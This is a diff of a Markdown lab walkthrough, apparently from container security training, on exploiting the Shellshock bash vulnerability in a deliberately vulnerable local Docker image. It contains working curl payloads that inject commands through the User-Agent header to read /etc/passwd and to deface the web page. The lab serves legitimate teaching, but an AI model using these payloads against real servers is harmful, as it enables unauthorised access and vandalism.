@@ -1,6 +1,6 @@
-## Vulnerable/Outdated Libraries - Shell-Shock (Bash) 
+## Vulnerable/Outdated Libraries - Shell-Shock (Bashdoor) 
 
-    
+###### Some containers that are often used and available on `dockerhub` are not updated regularly, which results in them having vulnerable packages and libraries. Shellshock is one such vulnerability found in older versions of bash that haven't been updated.
 
 ##### Step 1:
 
@@ -8,31 +8,26 @@
 
 	![](img/Open-Terminal.png)
 
+
 ##### Step 2:
 
-*  **cd** into  `/home/we45/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock`
+* Run the image vulnerable to shell-shock by running `docker run -d -it -p 8080:80 vulnerables/cve-2014-6271`
 
     ```commandline
-    cd /home/we45/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock
+    root@we45:~# docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
+    208ee69b40e260c5605cde5faca67e0428c7fe80a237b5cd5767f9e2e734f03d
+    root@we45:~#
     ```
+
 
 ##### Step 3:
 
-* Run the image vulnerable to shell-shock `docker run -d -it -p 8080:80 vulnerables/cve-2014-6271`
-
-    ```commandline
-    root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
-    208ee69b40e260c5605cde5faca67e0428c7fe80a237b5cd5767f9e2e734f03d
-    
-    ```
-    
-##### Step 4:
-
-* Open browser and run `http://localhost:8080` to verify the application is running or not.
+* Open the browser and go to `http://localhost:8080` to verify if the application is running.
 
 ![](img/shellshock-browser.png)
 
-##### Step 5:
+
+##### Step 4:
 
 * Run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable` to exploit the vulnerability and access the `/etc/passwd` file on the vulnerable container.
@@ -63,7 +58,7 @@ libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 ```
 
 
-##### Step 6:
+##### Step 5:
 
 * Run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable` to deface the website.
 
@@ -71,29 +66,19 @@ libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
 ```
 
-##### Step 7:
 
-* Access http://localhost:8080 on browser to confirm.
+##### Step 6:
+
+* Access `http://localhost:8080` on browser to confirm.
 
 ![](img/defaced.png)
 
-##### Step 8:
 
-* Run `clean-docker` to stop all containers.  
+##### Stop all running docker containers
 
-    ```commandline
-    (venv)root@we45: clean-docker
-    92200af86b18
-    ca94dab2d52e
-    92200af86b18
-    34c4adcf326d
-    86cd73d03ef1
-    ca94dab2d52e
-    "docker rmi" requires at least 1 argument.
-    See 'docker rmi --help'.
-    
-    Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]
-    
-    Remove one or more images
-    
-    ```
+* Run `clean-docker` to stop all the containers
+
+```commandline
+root@we45:~$ clean-docker
+```
+
